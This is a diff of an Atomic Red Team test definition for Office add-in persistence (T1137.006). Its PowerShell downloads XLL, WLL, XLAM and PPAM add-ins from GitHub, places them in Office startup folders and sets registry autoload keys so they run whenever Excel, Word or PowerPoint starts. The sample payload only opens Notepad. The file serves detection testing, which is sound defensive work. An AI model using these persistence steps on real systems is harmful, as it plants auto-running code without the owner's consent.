@@ -4,25 +4,201 @@ atomic_tests:
 - name: Code Executed Via Excel Add-in File (XLL)
   auto_generated_guid: 441b1a0f-a771-428a-8af0-e99e4698cda3
   description: |
-    Downloads a XLL file and loads it using the excel add-ins library.
-    This causes excel to display the message "Hello World". This does not include persistent code execution.
-    
-    The provided XLL is for 64-bit versions of Excel only. If you are using a 32-bit version this will fail and "False" will
-    be printed to the screen.
-    
-    [Source of XLL](https://github.com/edparcell/HelloWorldXll) 
+    Loads an XLL file using the excel add-ins library.
+    This causes excel to launch Notepad.exe as a child process. This atomic test does not include persistent code execution as you would typically see when this is implemented in malware.
   supported_platforms:
     - windows
-  input_arguments:
-    xll_url:
-      description: url of the file HelloWorldXll.xll
-      type: Url
-      default: 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/HelloWorldXll.xll'
-    local_file:
-      description: name of the xll file 
-      type: Path
-      default: $env:tmp\HelloWorldXll.xll
+  dependencies:
+  - description: |
+      Microsoft Excel must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Excel.Application" | Out-Null
+        Stop-Process -Name "Excel"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
+  - description: XLL files must exist on disk at specified location
+    prereq_command: |
+     if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll") -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")) {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"
   executor:
     name: powershell 
     command: |
-      iwr -URI '#{xll_url}' -o "#{local_file}"; (new-object -ComObject excel.application).RegisterXLL("$env:tmp\HelloWorldXll.xll")
+      $excelApp = New-Object -COMObject "Excel.Application"
+      if(-not $excelApp.path.contains("Program Files (x86)")){
+          Write-Host "64-bit Office"
+          $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll")
+      }
+      else{
+        Write-Host "32-bit Office"
+        $excelApp.RegisterXLL("PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")
+      }
+
+- name: Persistent Code Execution Via Excel Add-in File (XLL)
+  description: |
+    Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
+    The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
+  supported_platforms:
+    - windows
+  dependencies:
+  - description: |
+      Microsoft Excel must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Excel.Application" | Out-Null
+        Stop-Process -Name "Excel"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
+  - description: XLL files must exist on disk at specified location
+    prereq_command: |
+     if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll") -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll")) {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x64.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/excelxll_x86.xll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"
+  executor:
+    name: powershell
+    command: |
+      $excelApp = New-Object -COMObject "Excel.Application"
+      if(-not $excelApp.path.contains("Program Files (x86)")){
+          Write-Host "64-bit Office"
+          Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
+      }
+      else{
+        Write-Host "32-bit Office"
+        Copy "PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
+      }
+      $ver = $excelApp.version
+      $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
+      Remove-Item $ExcelRegPath -ErrorAction Ignore
+      New-Item -type Directory $ExcelRegPath | Out-Null
+      New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
+      $excelApp.Quit()
+      Start-Process "Excel"
+    cleanup_command: |
+      $ver = (New-Object -COMObject "Excel.Application").version
+      Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
+      Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
+      Start-Sleep 3
+      Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
+      
+- name: Persistent Code Execution Via Word Add-in File (WLL)
+  description: |
+    Creates a Word Add-in file (WLL) which runs automatically when Word is started
+    The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office.
+    Successfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office. 
+  supported_platforms:
+    - windows
+  dependencies:
+  - description: |
+      Microsoft Word must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Word.Application" | Out-Null
+        Stop-Process -Name "winword"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+  - description: WLL files must exist on disk at specified location
+    prereq_command: |
+     if ((Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll") -and (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll")) {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll"
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll"
+  executor:
+    name: powershell
+    command: |
+      $wdApp = New-Object -COMObject "Word.Application"
+      if(-not $wdApp.path.contains("Program Files (x86)"))  
+      {
+        Write-Host "64-bit Office"
+        Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x64.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"        
+      }
+      else{
+        Write-Host "32-bit Office"
+        Copy "PathToAtomicsFolder\T1137.006\bin\Addins\wordwll_x86.wll" "$env:APPDATA\Microsoft\Word\Startup\notepad.wll"
+      }
+      Stop-Process -Name "WinWord" 
+      Start-Process "WinWord"
+    cleanup_command: |
+      Stop-Process -Name "notepad","WinWord" -ErrorAction Ignore
+      Start-Sleep 3
+      Remove-Item "$env:APPDATA\Microsoft\Word\Startup\notepad.wll" -ErrorAction Ignore
+      
+- name: Persistent Code Execution Via Excel VBA Add-in File (XLAM)
+  description: |
+    Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started
+    The sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.
+  supported_platforms:
+    - windows
+  dependencies:
+  - description: |
+      Microsoft Excel must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "Excel.Application" | Out-Null
+        Stop-Process -Name "Excel"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
+  - description: XLAM file must exist on disk at specified location
+    prereq_command: |
+     if (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"
+  executor:
+    name: powershell
+    command: |
+      Copy "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam" "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"        
+      Start-Process "Excel"
+    cleanup_command: |
+      Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
+      Start-Sleep 3
+      Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
+
+- name: Persistent Code Execution Via PowerPoint VBA Add-in File (PPAM)
+  description: |
+    Creates a PowerPoint VBA Add-in file (PPAM) which runs automatically when PowerPoint is started
+    The sample PPA provided launches the notepad as a proof-of-concept for persistent execution from Office.
+  supported_platforms:
+    - windows
+  dependencies:
+  - description: |
+      Microsoft Excel must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "PowerPoint.Application" | Out-Null
+        Stop-Process -Name "PowerPnt"
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft PowerPoint manually to meet this requirement"
+  - description: PPAM file must exist on disk at specified location
+    prereq_command: |
+     if (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam") {exit 0} else {exit 1}
+    get_prereq_command: |-
+      Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/PptVBAaddin.ppam" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam"
+  executor:
+    name: powershell
+    command: |
+      Copy "PathToAtomicsFolder\T1137.006\bin\Addins\PptVBAaddin.ppam" "$env:APPDATA\Microsoft\Addins\notepad.ppam"
+      $ver = (New-Object -COMObject "PowerPoint.Application").version
+      $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad"
+      New-Item -type Directory $ExcelRegPath -Force | Out-Null
+      New-ItemProperty $ExcelRegPath "Autoload" -value "1" -propertyType DWORD  | Out-Null
+      New-ItemProperty $ExcelRegPath "Path" -value "notepad.ppam" -propertyType string | Out-Null
+      Stop-Process -Name "PowerPnt" -ErrorAction Ignore
+      Start-Process "PowerPnt"
+    cleanup_command: |
+      $ver = (New-Object -COMObject "PowerPoint.Application").version
+      Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\PowerPoint\AddIns\notepad" -ErrorAction Ignore
+      Stop-Process -Name "notepad","PowerPnt" -ErrorAction Ignore
+      Start-Sleep 3
+      Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.ppam"  -ErrorAction Ignore
